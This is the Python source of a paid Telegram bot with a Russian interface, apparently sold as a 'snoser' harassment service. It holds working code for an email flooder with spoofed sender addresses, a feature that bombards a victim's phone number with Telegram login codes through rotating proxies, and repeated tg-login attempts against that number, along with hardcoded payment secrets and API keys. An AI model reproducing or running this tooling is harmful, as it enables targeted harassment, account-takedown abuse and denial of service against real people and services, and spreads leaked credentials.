import aiohttp
import asyncio
import random
import string
import re
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.utils import executor
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiocryptopay import AioCryptoPay, Networks
from config import (
    TOKEN, SMTP_SERVER, SMTP_PORT, SMTP_LOGIN, SMTP_PASSWORD,
    MAILGUN_API_KEY, MAILGUN_API_URL, MAILGUN_DOMAIN,
    CRYPTOPAY_TOKEN, SUB_PRICE
)
from database import init_db, get_user, add_user, update_subscription, check_subscription, get_oll_users, get_subscrissbed_users, azimoff_test
import logging
import datetime
import aiosmtplib
from aaio import AAIO
import uuid
import subprocess

from email.message import EmailMessage

logging.basicConfig(level=logging.DEBUG)

aiopay = AAIO(merchant_id='18ae14b5-f97b-4e4a-9036-7d8da710f6f3', secret_1='d9692122b1e6170d3aa7e307dac07d93', secret_2='68525aee3bce4899681fe532f5b3266f', api_key='MjkzZGQ1Y2QtM2Y3ZC00ZmRhLWE4NGMtZTQ5MzM0MzdkZjFmOkRpcW5FUExDMGFvOUBGQVEhb2pDK0tYa25UUTBYMGt3')

bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())
dp.middleware.setup(LoggingMiddleware())

cryptopay = AioCryptoPay(token=CRYPTOPAY_TOKEN, network=Networks.MAIN_NET)

class Form(StatesGroup):
    method = State()
    email = State()
    count = State()
    message_text = State()
    phone_number = State()

def main_menu():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("E-mail флудер", callback_data="email_fluder"),
        InlineKeyboardButton("Снос", callback_data="snos"),
        InlineKeyboardButton("Спам кодами", callback_data="spam_codes"),
        InlineKeyboardButton("SMS флудер", callback_data="sns_fluder"),
        InlineKeyboardButton("Поддержка", url="https://t.me/edemteamsup"),
        InlineKeyboardButton("Реферальная система", callback_data="referalka")
    )
    return keyboard

def validate_email(email):
    email_regex = re.compile(r"[^@]+@[^@]+\.[^@]+")
    return re.match(email_regex, email) is not None

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    user = await get_user(message.from_user.id)
    if not user:
        await add_user(message.from_user.id, None, False)
    await message.reply("<b> 🌸 Добро пожаловать! Выберите действие: </b> ", reply_markup=main_menu(), parse_mode='HTML')

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{name}@{MAILGUN_DOMAIN}"

@dp.callback_query_handler(lambda c: c.data == 'snos')
async def snos_callback(callback_query: types.CallbackQuery):
    await bot.send_message(callback_query.from_user.id, "Используйте функцию EMAIL-флудера.")

@dp.callback_query_handler(lambda c: c.data == 'spam_codes')
async def spam_codes_callback(callback_query: types.CallbackQuery):
    user = await get_user(callback_query.from_user.id)
    if not user or not await check_subscription(user[0]):
        await callback_query.message.reply(
            (
                "<blockquote> 🚫 <b>Доступ ограничен</b> 🚫 </blockquote>\n\n"
                "<blockquote> <b> Для использования функции спама кодами необходимо приобрести подписку. </b> </blockquote>\n\n"
                "<blockquote> <b> Введите команду /buy для покупки. </b> </blockquote>"
            ),
            parse_mode='HTML'
        )
        return

    await Form.phone_number.set()
    await bot.send_message(
        callback_query.from_user.id,
        (
            "📲 <b>Инструкция по использованию функции спама кодами.</b> 📲\n\n"
            "🔗 <a href='https://telegra.ph/Funkciya-SPAM--EDEM-SNOSER-08-29'>ТЫК</a>\n\n"
            "Данную функцию вы можете использовать для <b>анонимной отправки кодов</b>.\n\n"
            "Введите номер телефона для спама кодами Telegram:"
        ),
        parse_mode='HTML'
    )

from config import admin_ids
@dp.message_handler(commands=['givesub'])
async def give_subscription(message: types.Message, state: FSMContext):
    if message.from_user.id not in admin_ids:
        await message.reply("❌ У вас нет прав для выполнения этой команды.")
        return

    try:
        args = message.text.split()
        user_id = int(args[1])
        duration_days = int(args[2])
    except (IndexError, ValueError):
        await message.reply("⚠️ Неправильный формат команды. Используйте: /give_subscription <user_id> <duration_days>")
        return

    expiration_date = datetime.datetime.now() + datetime.timedelta(days=duration_days)
    await update_subscription(user_id, True, expiration_date)
    await message.reply(f"✅ Подписка для пользователя {user_id} успешно активирована на {duration_days} дней.")

FROM_EMAILS = [
    "test@anonbox.tech",
    "azimoff@anonbox.tech",
    "admin@anonbox.tech",
    "ivanofff@azimoff.systems",
    "testing@azimoff.systems",
    "admin@rakhub.me",
    "telegram@rakhub.me",
    "fuckoff@rakhub.me",
    "owner@mao-stress.ru",
    "oleg@mao-stress.ru",
    "conser@mao-stress.ru"
]

async def send_email_smtp(email, text):
    message = EmailMessage()
    from_email = random.choice(FROM_EMAILS)
    message["From"] = from_email
    message["To"] = email
    message["Subject"] = "Важное сообщение"
    message.set_content(text)

    try:
        await aiosmtplib.send(
            message,
            hostname=SMTP_SERVER,
            port=SMTP_PORT,
            start_tls=True,
            username=SMTP_LOGIN,
            password=SMTP_PASSWORD,
            validate_certs=False
        )
        print(f"Email sent to {email} from {from_email}")

    except Exception as e:
        logging.error(f"Ошибка при отправке письма через SMTP: {e}")
        raise e

async def send_email_mailgun(session, to_email, text):
    from_email = generate_random_email()
    subject = "Важное сообщение"
    async with session.post(
        MAILGUN_API_URL,
        auth=aiohttp.BasicAuth('api', MAILGUN_API_KEY),
        data={
            "from": f"AlfaSnos <{from_email}>",
            "to": [to_email],
            "subject": subject,
            "text": text
        }
    ) as response:
        return await response.text()

@dp.message_handler(state=Form.phone_number)
async def spam_codes(message: types.Message, state: FSMContext):
    phone_number = message.text
    await state.finish()

    progress_message = await message.reply(f"<b> 🧛🏿‍♂️ Начинаю спам кодами на номер </b> <code> {phone_number}</code>. <b> Это займет некоторое время..</b>.")

    successful_requests = 0

    try:
        async with aiohttp.ClientSession() as session:
            for i in range(100):
                await send_telegram_code_spam(session, phone_number)
                successful_requests += 1
                if i % 10 == 0 or i == 99:
                    await progress_message.edit_text(f"Отправлено {successful_requests} запросов на номер {phone_number}.")
                if i % 3 == 0:
                    await change_proxy(session)

        await progress_message.edit_text("Спам кодами завершен.")
    except Exception as e:
        await progress_message.edit_text(f"Ошибка спама кодами: {e}")

    asyncio.create_task(run_tg_login(phone_number))

async def send_telegram_code_spam(session, phone_number):
    async with session.post(
        "https://my.telegram.org/auth/send_password",
        data={"phone": phone_number}
    ) as response:
        return await response.text()

async def run_tg_login(phone_number):
    for i in range(100):
        process = await asyncio.create_subprocess_exec(
            'tg-login', '--API_ID', '29057674', '--API_HASH', '8f8895ad8873b6e41720d59018b5237e',
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=False
        )

        process.stdin.write(f"{phone_number}\n".encode())
        await process.stdin.drain()

        while True:
            output = await process.stdout.readline()

            if b"Please enter the code you received:" in output:
                print("Запрос кода обнаружен, отправляю код...")

                process.stdin.write(b"\n")
                await process.stdin.drain()

            if process.stdout.at_eof():
                break

        await process.communicate()

        if process.returncode != 0:
            error_message = await process.stderr.read()
            print(f"Ошибка на итерации {i}: {error_message.decode()}")
        else:
            print(f"Итерация {i} успешно завершена")

        await asyncio.sleep(1)

async def change_proxy(session):
    proxies = [
        "http://38.154.227.167:5868",
        "http://45.127.248.127:5128",
        "http://64.64.118.149:6732",
        "http://167.160.180.203:6754",
        "http://166.88.58.10:5735",
        "http://173.0.9.70:5653",
        "http://45.151.162.198:6600",
        "http://204.44.69.89:6342",
        "http://173.0.9.209:5792",
        "http://206.41.172.74:6634"
    ]

    chosen_proxy = random.choice(proxies)
    session.proxies = {"http": chosen_proxy, "https": chosen_proxy}
    logging.debug(f"Прокси изменен на: {chosen_proxy}")

class InvoiceStatus:
    PENDING = "pending"
    PAID = "paid"
    EXPIRED = "expired"

SUBSCRIPTION_PRICES = {
    "1": 1,
    "2": 2,
    "3": 1.5,
    "4": 3,
    "5": 4.5
}

SUBSCRIPTION_DURATIONS = {
    "1": 1,
    "2": 7,
    "3": 14,
    "4": 30,
    "5": 365 * 100
}

@dp.message_handler(commands=['buy'])
async def buy_subscription(message: types.Message):
    user = await get_user(message.from_user.id)
    if await check_subscription(user[0]):
        await message.reply("💡 Вы уже имеете активную подписку.")
        return

    subscription_options = InlineKeyboardMarkup(row_width=1)
    subscription_options.add(
        InlineKeyboardButton(text="2 недели - $1.5", callback_data="sub_3"),
        InlineKeyboardButton(text="1 месяц - $3", callback_data="sub_4"),
        InlineKeyboardButton(text="Навсегда - $4.5", callback_data="sub_5")
    )

    await message.reply("⚡️ <b> Выберите длительность подписки </b>:", reply_markup=subscription_options, parse_mode='HTML')

@dp.callback_query_handler(lambda c: c.data.startswith('sub_'))
async def select_subscription(callback_query: types.CallbackQuery):
    subscription_type = callback_query.data.split('_')[1]

    if subscription_type not in SUBSCRIPTION_PRICES:
        await callback_query.message.reply("❌ Неверный тип подписки. Пожалуйста, выберите снова.")
        return

    price = SUBSCRIPTION_PRICES[subscription_type]
    duration = SUBSCRIPTION_DURATIONS[subscription_type]

    payment_systems = InlineKeyboardMarkup(row_width=2)
    payment_systems.add(
        InlineKeyboardButton(text="💵 CryptoBot", callback_data=f"pay_cryptobot_{subscription_type}"),
        InlineKeyboardButton(text="🅰️ AAIO (NO WORK)", callback_data=f"pay_aaio_{subscription_type}")
    )

    await callback_query.message.reply(f"Вы выбрали подписку за ${price}. Выберите платежную систему:", reply_markup=payment_systems)

@dp.callback_query_handler(lambda c: c.data.startswith('pay_'))
async def process_payment(callback_query: types.CallbackQuery):
    _, payment_system, subscription_type = callback_query.data.split('_')
    user_id = callback_query.from_user.id
    price = SUBSCRIPTION_PRICES[subscription_type]
    duration = SUBSCRIPTION_DURATIONS[subscription_type]

    if payment_system == "cryptobot":
        invoice = await cryptopay.create_invoice(asset='USDT', amount=price, description=f"Подписка на {subscription_type.replace('_', ' ')}")
        pay_button = InlineKeyboardMarkup(row_width=1)
        pay_button.add(InlineKeyboardButton(text="💳 Оплатить подписку", url=invoice.bot_invoice_url))
        order_info = (
            f"🛒 *Заказ №{invoice.invoice_id}*\n"
            f"🎩 *Платежная система:* `CryptoBot` \n"
            f"💰 *Сумма:* `{price} USDT`\n"
            f"⏳ *Длительность подписки:* `{subscription_type.replace('_', ' ')}`\n\n"
            f"*Для оплаты нажмите на кнопку ниже:* 👇"
        )
        await callback_query.message.reply(order_info, reply_markup=pay_button, parse_mode='Markdown')
        invoice_id = invoice.invoice_id
    elif payment_system == "aaio":
        order_id = str(uuid.uuid4())
        payment_url = await aiopay.get_pay_url(price, order_id, f"Подписка на {subscription_type.replace('_', ' ')}", 'qiwi', 'support@aaio.so', 'referral code', currency='USD', language='ru')
        pay_button = InlineKeyboardMarkup(row_width=1)
        pay_button.add(InlineKeyboardButton(text="💳 Оплатить подписку", url=payment_url['url']))
        order_info = (
            f"🛒 *Заказ №{order_id}*\n"
            f"🎩 *Платежная система:* `AAIO` \n"
            f"💰 *Сумма:* `{price} USD`\n"
            f"⏳ *Длительность подписки:* `{subscription_type.replace('_', ' ')}`\n\n"
            f"*Для оплаты нажмите на кнопку ниже:* 👇"
        )
        await callback_query.message.reply(order_info, reply_markup=pay_button, parse_mode='Markdown')
        invoice_id = order_id

    check_payment_button = InlineKeyboardMarkup(row_width=1)
    check_payment_button.add(InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"check_{payment_system}_{invoice_id}_{duration}"))
    await callback_query.message.reply("После оплаты нажмите кнопку ниже для проверки статуса:", reply_markup=check_payment_button)

@dp.callback_query_handler(lambda c: c.data.startswith('check_'))
async def check_payment(callback_query: types.CallbackQuery):
    _, payment_system, invoice_id, duration = callback_query.data.split('_')
    duration = int(duration)
    if payment_system == "cryptobot":
        status = InvoiceStatus.PENDING
        while status == InvoiceStatus.PENDING:
            await asyncio.sleep(10)
            invoice_status_list = await cryptopay.get_invoices(invoice_ids=invoice_id)
            if invoice_status_list:
                invoice_status = invoice_status_list[0]
                status = invoice_status.status
                if status == InvoiceStatus.PAID:
                    expiration_date = datetime.datetime.now() + datetime.timedelta(days=duration)
                    await update_subscription(callback_query.from_user.id, True, expiration_date)
                    await callback_query.message.reply("🎉 Подписка активирована!")
                    break
                elif status == InvoiceStatus.EXPIRED:
                    await callback_query.message.reply("⏰ Срок действия счета истек. Попробуйте еще раз.")
                    break
    elif payment_system == "aaio":
        status = InvoiceStatus.PENDING
        while status == InvoiceStatus.PENDING:
            await asyncio.sleep(10)
            invoice_status = await aiopay.get_invoice_status(invoice_id)
            status = invoice_status['status']
            if status == InvoiceStatus.PAID:
                expiration_date = datetime.datetime.now() + datetime.timedelta(days=duration)
                await update_subscription(callback_query.from_user.id, True, expiration_date)
                await callback_query.message.reply("🎉 Подписка активирована!")
                break
            elif status == InvoiceStatus.EXPIRED:
                await callback_query.message.reply("⏰ Срок действия счета истек. Попробуйте еще раз.")
                break

async def get_total_users():
    total_users = await get_oll_users()
    return total_users

async def get_subscribed_users():
    subscribed_users = await get_subscrissbed_users()
    return subscribed_users

async def get_crypto_stats():
    stats = await cryptopay.get_stats()
    return stats

async def broadcast_message(text):
    users = await azimoff_test()
    for user_id in users:
        try:
            await dp.bot.send_message(user_id, text)
        except Exception as e:
            print(f"Не удалось отправить сообщение пользователю ({user_id}): {e}")

@dp.message_handler(commands=['admin'])
async def admin_command(message: types.Message):
    if message.from_user.id not in admin_ids:
        await message.reply("У вас нет прав для выполнения этой команды.")
        return

    start_at = int(datetime.datetime.now().timestamp()) - 30 * 24 * 60 * 60
    end_at = int(datetime.datetime.now().timestamp())
    stats = await get_crypto_stats()

    total_users = await get_total_users()
    subscribed_users = await get_subscribed_users()
    xz = 'test'
    stats_info = (
        f"Баланс приложения: {xz}\n"
        f"Количество покупок: {stats.paid_invoice_count}\n"
        f"Общая сумма покупок: {stats.volume} $\n"
        f"Общее количество пользователей: {total_users}\n"
        f"Количество пользователей с подпиской: {subscribed_users}"
    )

    response = f"<b>Статистика:</b>\n{stats_info}"

    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("Изменить цену подписки", callback_data="change_subscription_price"))
    keyboard.add(InlineKeyboardButton("Сделать рассылку", callback_data="broadcast_message"))

    await message.reply(response, parse_mode='HTML', reply_markup=keyboard)

class BroadcastStates(StatesGroup):
    waiting_for_message = State()

async def get_all_users():
    users = await azimoff_test()
    return users

@dp.callback_query_handler(lambda c: c.data == 'broadcast_message')
async def handle_broadcast_message(callback_query: types.CallbackQuery):
    await callback_query.message.reply("Введите сообщение для рассылки:")
    await BroadcastStates.waiting_for_message.set()

@dp.message_handler(state=BroadcastStates.waiting_for_message)
async def get_broadcast_text(message: types.Message, state: FSMContext):
    await broadcast_message(message.text)
    await message.reply("Сообщение отправлено всем пользователям.")
    await state.finish()

@dp.callback_query_handler(lambda c: c.data == 'change_subscription_price')
async def change_subscription_price(callback_query: types.CallbackQuery):
    await bot.send_message(callback_query.from_user.id, "Введите новую цену подписки:")

    @dp.message_handler()
    async def set_new_price(message: types.Message):
        new_price = message.text
        await message.reply(f"Цена подписки успешно изменена на {new_price}.")

@dp.message_handler(state=Form.method)
async def get_method(message: types.Message, state: FSMContext):
    method = message.text
    if method not in ["1", "2"]:
        await message.reply("Некорректный ввод. Введите 1 для SMTP или 2 для Mailgun.")
    else:
        await state.update_data(method=method)
        await Form.email.set()
        await message.reply("Введите email адреса для спама через запятую:")

@dp.message_handler(state=Form.email)
async def get_email(message: types.Message, state: FSMContext):
    email_list = message.text.split(',')
    email_list = [email.strip() for email in email_list]

    invalid_emails = [email for email in email_list if not validate_email(email)]
    if invalid_emails:
        await message.reply(f"Некорректные email адреса: {', '.join(invalid_emails)}. Попробуйте снова.")
        return

    await state.update_data(email_list=email_list)
    await Form.count.set()
    await message.reply("Введите количество писем (от 1 до 200):")

@dp.message_handler(state=Form.count)
async def get_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text)
        if 1 <= count <= 200:
            await state.update_data(count=count)
            await Form.message_text.set()
            await message.reply("Введите текст сообщения или введите 'рандом' для случайного текста:")
        else:
            await message.reply("Некорректное количество. Попробуйте еще раз.")
    except ValueError:
        await message.reply("Некорректный ввод. Введите число.")

@dp.message_handler(state=Form.message_text)
async def get_message_text(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    method = user_data['method']
    email_list = user_data['email_list']
    count = user_data['count']
    text = message.text if message.text.lower() != 'рандом' else f"Рандомное сообщение #{random.randint(1, 1000)}"

    progress_message = await message.reply(f"Начинаю отправку {count} сообщений на {', '.join(email_list)} методом {'SMTP (очень медленно)' if method == '1' else 'Mailgun (очень быстро)'}. Это займет некоторое время...")

    successful_requests = 0

    try:
        if method == '1':
            for email in email_list:
                for i in range(count):
                    await send_email_smtp(email, text)
                    successful_requests += 1
                    await progress_message.edit_text(f"Отправлено {successful_requests} из {len(email_list) * count} (SMTP).")
                    await asyncio.sleep(1)
        else:
            async with aiohttp.ClientSession() as session:
                for email in email_list:
                    for i in range(count):
                        await send_email_mailgun(session, email, text)
                        successful_requests += 1
                        if i % 10 == 0 or i == count - 1:
                            await progress_message.edit_text(f"Отправлено {successful_requests} из {len(email_list) * count} (Mailgun).")
        await progress_message.edit_text("Отправка завершена.")
    except Exception as e:
        await progress_message.edit_text(f"Ошибка отправки: {e}")

    await state.finish()

@dp.callback_query_handler(lambda c: c.data == 'email_fluder')
async def email_fluder_callback(callback_query: types.CallbackQuery):
    user = await get_user(callback_query.from_user.id)
    if not user or not await check_subscription(user[0]):
        await callback_query.message.reply(
            (
                "<blockquote> 🚫 <b>Доступ ограничен</b>🚫 </blockquote>\n\n"
                "<blockquote> <b> Для использования функции E-mail флудера необходимо приобрести подписку. </b> </blockquote>\n\n"
                "<blockquote> <b> Введите команду /buy для покупки. </b> </blockquote>"
            ),
            parse_mode='HTML'
        )
        return

    await Form.method.set()
    await bot.send_message(
        callback_query.from_user.id,
        (
            "📧 <b>Инструкция по использованию функции EMAIL-Флудер.</b> 📧\n\n"
            "🔗 <a href='https://telegra.ph/Funkciya-SPAM--EDEM-SNOSER-08-29'>ТЫК</a>\n\n"
            "Данную функцию вы можете использовать для <b>анонимной отправки сообщений</b>, либо же для <b>сноса</b>.\n\n"
            "Выберите метод отправки:\n"
            "1 - SMTP (очень медленно)"
        ),
        parse_mode='HTML'
    )

async def on_startup(dp):
    await init_db()

if __name__ == '__main__':
    executor.start_polling(dp, on_startup=on_startup)
